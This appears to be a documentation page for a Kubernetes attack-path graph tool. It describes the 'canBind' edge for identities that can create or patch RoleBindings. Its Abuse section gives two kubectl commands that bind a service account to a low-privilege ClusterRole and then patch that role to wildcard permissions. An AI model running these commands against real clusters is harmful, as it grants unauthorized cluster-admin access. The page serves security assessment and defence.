# canBind

## Edge Schema

- **Source:** [Identity](../NodeDescriptions/Identity.md)
- **Target:** [Namespace](../NodeDescriptions/Namespace.md) / [Cluster](../NodeDescriptions/Cluster.md)

## General Information

The Identity holds `create` or `patch` permissions on RoleBindings or ClusterRoleBindings. Points to the Namespace for RoleBinding permissions, Cluster for ClusterRoleBinding permissions.

## Abuse

Create or modify RoleBindings and ClusterRoleBindings. Kubernetes enforces that you can only bind a role if you already hold all the permissions it grants, or if you have been explicitly granted the `bind` verb on that specific role. Without either condition, the API server will reject the request, meaning `canBind` alone cannot escalate beyond your current permission set and is primarily useful for persistence.

The escalation path opens when combined with `canEscalate`. Creating a new wildcard role and then binding it does not work. The binding check rejects it because you don't already hold `*/*` and you have no `bind` verb on the newly created role. Instead: find a low-privilege role you can currently bind, bind yourself to it first (the check passes while the role is still low-priv), then use `canEscalate` to escalate that same role to wildcard permissions. The existing binding now covers the escalated permissions.

```bash
# Step 1: bind to a low-privilege role whose permissions you already hold
# (binding check passes because the role is within your current permission set)
kubectl create clusterrolebinding pwned \
  --clusterrole=<low-priv-role> \
  --serviceaccount=<namespace>:<serviceaccount>

# Step 2: escalate that role to wildcard (requires canEscalate)
# the existing binding now covers the escalated permissions
kubectl patch clusterrole <low-priv-role> --type=json \
  -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'
```

## References

- [Kubernetes RoleBinding](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#rolebinding-and-clusterrolebinding)
- [HackTricks - Abusing Roles/ClusterRoles in Kubernetes](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes)
- [OWASP K02 - Overly Permissive Authorization Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)